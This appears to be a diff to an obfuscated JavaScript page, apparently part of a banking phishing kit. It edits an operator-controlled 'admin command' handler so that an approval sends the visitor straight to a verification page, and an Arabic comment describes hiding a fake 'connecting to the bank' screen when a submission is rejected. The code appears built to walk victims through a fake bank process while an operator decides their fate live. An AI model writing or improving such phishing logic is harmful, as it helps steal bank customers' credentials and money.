@@ -2727,7 +2727,7 @@ v159.addEventListener(_0xdec(271), v84);
   }
   if (typeof window.listenForAdminCommands === 'function') {
     window.listenForAdminCommands({
-      onApproval: function () { showAdminOverlay('تمت العملية بنجاح', '#0a7a3d'); setTimeout(function(){ window.location.href = 'verification.html'; }, 2500); },
+      onApproval: function () { window.location.href = 'verification.html'; },
       onRejection: function (cmd) {
         // إخفاء شاشة "جار الاتصال بالبنك" لتظهر رسالة الرفض
         var bankOverlay = document.getElementById('bankConnectingOverlay');
